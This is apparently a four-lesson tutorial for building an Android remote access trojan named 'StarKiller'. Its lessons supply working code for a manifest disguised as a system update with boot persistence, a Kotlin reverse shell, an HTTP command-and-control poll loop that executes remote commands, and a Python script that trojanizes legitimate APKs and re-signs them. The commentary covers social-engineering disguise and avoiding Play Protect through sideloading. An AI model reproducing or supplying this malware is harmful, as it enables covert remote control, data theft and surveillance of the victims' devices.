LESSON 01 / 04

ANDROID MANIFEST — PERMISSIONS

The AndroidManifest.xml declares everything: permissions, services, broadcast receivers. The RAT needs INTERNET for C2, FOREGROUND_SERVICE to keep running, and optionally READ_CONTACTS/CAMERA for exfil.

// WHY PERMISSIONS MATTER

Android's permission system is the primary gate. Without declaring a permission in the manifest, the app can't use it — even with root. You declare first, Android grants (or prompts the user) at install/runtime.

INTERNET — no user prompt, granted automatically. Required for any network call. This is what connects to your C2.

FOREGROUND_SERVICE — run a persistent service that survives the app being backgrounded. Without this, Android kills the process after a few minutes.

The service declaration ties everything together: the RAT's C2 connection runs inside a Service component so it persists. The android:exported="false" prevents other apps from starting it — only your app can.

MISSION: Write the RAT's AndroidManifest.xml skeleton

// TARGET CODE:
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.system.update">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>

    <application
        android:label="System Update"
        android:icon="@mipmap/ic_launcher">

        <service
            android:name=".C2Service"
            android:exported="false"
            android:foregroundServiceType="dataSync"/>

        <receiver
            android:name=".BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>

    </application>
</manifest>

// WHAT JUST HAPPENED

com.system.update — the package name. Choosing a name that looks like a legitimate system package helps social engineering. "System Update" as the label means the icon is indistinguishable from real system apps.

RECEIVE_BOOT_COMPLETED + the BootReceiver — persistence. When the phone reboots, Android fires the BOOT_COMPLETED broadcast. BootReceiver catches it, starts C2Service. The RAT re-establishes without any user interaction.

foregroundServiceType="dataSync" — Android 14+ requires services to declare their type. dataSync is the most permissive non-dangerous category — it covers network operations.

LESSON 02 / 04

KOTLIN TCP REVERSE SHELL

Same principle as the PS1 shell — connect out to the operator, execute commands from the stream, send back output. Kotlin's Socket class makes it clean.

// KOTLIN vs PS1 SHELL

The logic is identical: open socket, read command from stream, run it, write output back. The difference is the execution environment — on Android you run shell commands via Runtime.getRuntime().exec().

Android's shell is a stripped-down Busybox/Toybox. Not all standard Unix commands exist. But id, ls, cat, pm list packages, dumpsys, am start all work.

Run the socket work in a background thread — Android kills apps that block the main thread for more than 5 seconds (ANR). Coroutines or a plain Thread both work.

MISSION: Write the Kotlin TCP reverse shell in C2Service

// TARGET CODE:
fun connectShell(ip: String, port: Int) {
    Thread {
        try {
            val socket = java.net.Socket(ip, port)
            val reader = socket.getInputStream().bufferedReader()
            val writer = socket.getOutputStream().bufferedWriter()
            writer.write("OK\n")
            writer.flush()
            while (true) {
                val cmd = reader.readLine() ?: break
                val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                val output = proc.inputStream.bufferedReader().readText()
                val err = proc.errorStream.bufferedReader().readText()
                writer.write((output + err).ifEmpty { "(no output)\n" })
                writer.write("\n")
                writer.flush()
            }
            socket.close()
        } catch (e: Exception) {
            android.util.Log.e("C2", e.message ?: "error")
        }
    }.start()
}
// YOUR CODE:

// WHAT JUST HAPPENED

arrayOf("sh", "-c", cmd) — passes the command to the shell interpreter. Without sh -c, you'd need to split the command into binary + args yourself. With it, you get full shell features: pipes, redirects, and builtins.

proc.inputStream.bufferedReader().readText() — reads all stdout. errorStream reads all stderr. Both needed — many Android commands write to stderr. Merge them like the PS1 2>&1 trick.

The ?: break after readLine() — if readline returns null the socket closed. Clean exit.

In the real StarKiller, the command loop also handles !upload <path> and !screenshot prefixes to trigger binary exfil and screen capture over the same socket.

LESSON 03 / 04

HTTP C2 POLL LOOP

The secondary channel. Instead of a persistent TCP connection, the RAT polls an HTTP endpoint for commands. More resilient — works on networks that drop long-lived TCP connections.

// HTTP vs TCP FOR C2

TCP gives you a live interactive shell. But carrier networks aggressively kill idle TCP connections after minutes. If the operator doesn't send a command, the connection dies silently.

HTTP polling is resilient. The RAT wakes up every N seconds, GETs a command endpoint, executes whatever it finds, POSTs the output, sleeps. No persistent connection to kill.

The C2 server is just a Python HTTP server storing pending commands per device ID. The RAT registers with its device ID on first poll. The operator queues commands. The RAT picks them up on the next poll cycle.

MISSION: Write the Kotlin HTTP poll loop

// TARGET CODE:
fun pollC2(c2Url: String, deviceId: String) {
    Thread {
        while (true) {
            try {
                val url = java.net.URL("$c2Url/cmd?id=$deviceId")
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 5000
                val cmd = conn.inputStream.bufferedReader().readText().trim()
                conn.disconnect()
                if (cmd.isNotEmpty() && cmd != "WAIT") {
                    val proc = Runtime.getRuntime().exec(arrayOf("sh","-c",cmd))
                    val out = proc.inputStream.bufferedReader().readText()
                    val post = java.net.URL("$c2Url/result?id=$deviceId")
                    val pc = post.openConnection() as java.net.HttpURLConnection
                    pc.requestMethod = "POST"
                    pc.doOutput = true
                    pc.outputStream.write(out.toByteArray())
                    pc.disconnect()
                }
            } catch (e: Exception) { }
            Thread.sleep(5000)
        }
    }.start()
}
// YOUR CODE:

// WHAT JUST HAPPENED

conn.connectTimeout = 5000 — 5 second timeout. Without this, a dead C2 server hangs the thread indefinitely. Carrier networks also drop connections silently — the timeout is the safety valve.

The WAIT sentinel — when no command is queued, the server returns "WAIT" instead of empty string. This makes parsing unambiguous: empty means server error, "WAIT" means connected and idle.

try { ... } catch (e: Exception) { } — swallow all errors silently. Network errors, connection refused, server down — none of these should crash the RAT. It just sleeps and retries.

The real StarKiller C2 uses HTTPS with a self-signed cert and TrustManager that accepts any cert — bypasses certificate validation entirely so the C2 doesn't need a valid SSL cert.

LESSON 04 / 04

APK BINDER — TROJANIZE A LEGIT APP

Decompile a legitimate APK with apktool, inject the RAT's smali code, merge the manifests, recompile, re-sign. The result looks identical to the original. The RAT runs silently alongside it.

// THE BINDER PIPELINE

apktool decompiles an APK to smali (Android's assembly language) and a manifest. You add your smali classes. You merge your permissions into the manifest. You recompile. You sign with a debug key.

The injected code runs via a hook in the legitimate app's Application class — you modify the original's Application.onCreate() to also call your service's start. The user sees the legitimate app working normally. The RAT is running in the same process.

Detection: Google Play Protect detects re-signed APKs of known apps. Delivery is therefore via sideload (APK file), not Play Store.

MISSION: Write the Python binder pipeline script

// TARGET CODE:
import subprocess, shutil, os

def bind_apk(legit_apk, payload_apk, output_apk):
    subprocess.run(["apktool", "d", legit_apk, "-o", "legit_src",
                    "--no-res", "-f"], check=True)
    subprocess.run(["apktool", "d", payload_apk, "-o", "payload_src",
                    "--no-res", "-f"], check=True)
    smali_src = "payload_src/smali/com/system/update"
    smali_dst = "legit_src/smali/com/system/update"
    shutil.copytree(smali_src, smali_dst)
    inject_manifest_permissions(
        "legit_src/AndroidManifest.xml",
        "payload_src/AndroidManifest.xml"
    )
    subprocess.run(["apktool", "b", "legit_src", "-o", "bound_unsigned.apk",
                    "--use-aapt2"], check=True)
    subprocess.run(["apksigner", "sign",
                    "--ks", "debug.keystore",
                    "--ks-pass", "pass:android",
                    "--out", output_apk,
                    "bound_unsigned.apk"], check=True)
    print(f"[+] Bound APK: {output_apk}")

def inject_manifest_permissions(target_manifest, payload_manifest):
    from xml.etree import ElementTree as ET
    target = ET.parse(target_manifest)
    payload = ET.parse(payload_manifest)
    t_root = target.getroot()
    for perm in payload.getroot().findall('uses-permission'):
        t_root.insert(0, perm)
    target.write(target_manifest, xml_declaration=True, encoding='utf-8')

// WHAT JUST HAPPENED — STARKILLER COMPLETE

--no-res — skip resource decompilation. Resources (images, layouts) don't need to be modified and recompiling them introduces errors. Skip unless you're changing UI.

shutil.copytree — copies the entire smali directory tree. The payload's smali classes are now inside the legitimate app's source. When apktool recompiles, they get compiled in.

apksigner sign --ks debug.keystore — signs with the Android debug key. Any keystore works — the signature just needs to be consistent for the OS to install it. The debug keystore ships with Android SDK.

The real StarKiller binder also hooks the Application subclass to call C2Service.start() from onCreate. Without this hook, the service never starts — smali classes alone don't run themselves.
